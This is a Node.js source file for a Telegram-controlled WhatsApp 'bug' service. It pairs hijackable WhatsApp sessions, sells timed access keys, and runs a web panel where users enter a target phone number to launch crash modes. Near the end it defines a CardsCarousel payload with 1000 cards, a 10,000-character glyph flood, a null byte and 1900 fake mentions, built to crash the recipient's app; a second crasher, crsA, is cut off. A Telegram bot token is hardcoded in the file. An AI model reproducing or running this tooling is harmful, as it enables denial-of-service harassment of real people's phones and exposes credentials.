// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8497929156:AAGluxlsc6oS8oPBY1TQmkIvYuyb6WrLRZ4";
const OWNER_ID = "7609584379";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
// Helper sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadMod() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveMod(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadMod();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadMod();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DEWA1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const teks = `( 🍁 ) ─── ❖ 情報 ❖  
𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 × 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺  
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝐗𝐈𝐒 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
 ࿇ Author : —!s' anonymous_vxc
 ࿇ Type : ( Case─Plugins )
 ࿇ League : Asia/Jakarta-
┌─────────
├──── ▢ ( 𖣂 ) Sender Handler
├── ▢ owner users
│── /addbot — &lt;nomor&gt;
│── /listsender —
│── /delsender — &lt;nomor&gt;
│── /add — &lt;cards.json&gt;
└────
┌─────────
├──── ▢ ( 𖣂 ) Key Manager
├── ▢ admin users
│── /ckey — &lt;username,durasi&gt;
│── /listkey —
│── /delkey — &lt;username&gt;
└────
┌─────────
├──── ▢ ( 𖣂 ) Access Controls
├── ▢ owner users
│── /addacces — &lt;user/id&gt;
│── /delacces — &lt;user/id&gt;
│── /addowner — &lt;user/id&gt;
│── /delowner — &lt;user/id&gt;
│── /setjeda — &lt;1m/1d/1s&gt;
└────`;
  
  ctx.reply(teks, { parse_mode: "HTML" });
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addbot Number_\n_Example : /addbot 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] - ONLY ACCES USER\n—Please register first to access this feature."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ *Syntax Error!*\n\n_Use : /ckey User,Day_\n_Example : /ckey rann,30d"
      
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h"
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

// Kirim detail ke user (DM)
ctx.telegram.sendMessage(
  userId,
  `✅ <b>Key berhasil dibuat:</b>\n\n` +
  `🆔 <b>Username:</b> <code>${username}</code>\n` +
  `🔑 <b>Key:</b> <code>${key}</code>\n` +
  `⏳ <b>Expired:</b> <i>${expiredStr}</i> WIB\n\n` +
  `<b>Note:</b>\n- Jangan disebar\n- Jangan difreekan\n- Jangan dijual lagi`,
  { parse_mode: "HTML" }
).then(() => {
  // Setelah terkirim → kasih notifikasi di group
  ctx.reply("✅ Success Send Key");
}).catch(err => {
  ctx.reply("❌ Gagal mengirim key ke user.");
  console.error("Error kirim key:", err);
});
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadMod();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveMod(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 7066156416_", { parse_mode: "Markdown" });

  const data = loadMod();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveMod(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadMod();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveMod(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 7066156416_", { parse_mode: "Markdown" });

  const data = loadMod();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveMod(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT SILENT INVISTUS
├─ ID OWN : ${OWNER_ID}
├─ DEVOLOPER : yamzzoffc 
├─ CREDIT BY : yamzzoffc  
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        androcrash(24, target);
      } else if (mode === "blank") {
        Ipongcrash(24, target);
      } else if (mode === "andros-delay") {
        androdelay(24, target);
      } else if (mode === "combo") {
        Iponginvis(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadMod, 
  saveMod, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== LETAK FUNCTIONS ==================== //
//Func Card
async function CardsCarousel(target) {
    try {
        const cards = Array.from({ length: 1000 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "  Hi Xrelly :) " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤHi Xrelly :)ㅤ" }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: 'Im So alone', // buat effect tambahin crash text kalau mau 
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                    fileLength: "10840",
                    height: 10,
                    width: 10,
                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1721344123",
                    jpegThumbnail: ""
                }
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        }));

        const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

        const carousel = generateWAMessageFromContent(
            target, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `You, You Disappointed Me \n${"𑜦".repeat(10000)}:)\n\u0000` 
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ 
                                text: "`YT:` https://youtube.com/@YukinaHiiragiDevils" 
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({ 
                                hasMediaAttachment: false 
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                                cards: cards 
                            }),
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () => 
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                                ],
                                remoteJid: target,
                                participant: death,
                                stanzaId: "1234567890ABCDEF"
                            }
                        })
                    }
                }
            }, 
            { userJid: target }
        );

        await sock.relayMessage(target, carousel.message, {
            messageId: carousel.key.id,
            participant: { jid: target }
        });

        console.log(`Successfully Send Crash `);
        return { status: "success", messageId: carousel.key.id };
        
    } catch (err) {
        console.error("Error sending carousel:", err);
        return { 
            status: "error", 
            error: err.message,
            stack: err.stack 
        };
    }
  }
// Func Crash2
async function crsA(sock, target) {
 const generateMentions = (count) => [
 "0@s.whatsapp.net",
    ...Array.from({ length: count }, () => `1${Math.floor(Math.random() * 900000)}@s.whatsapp.net`)
 ];
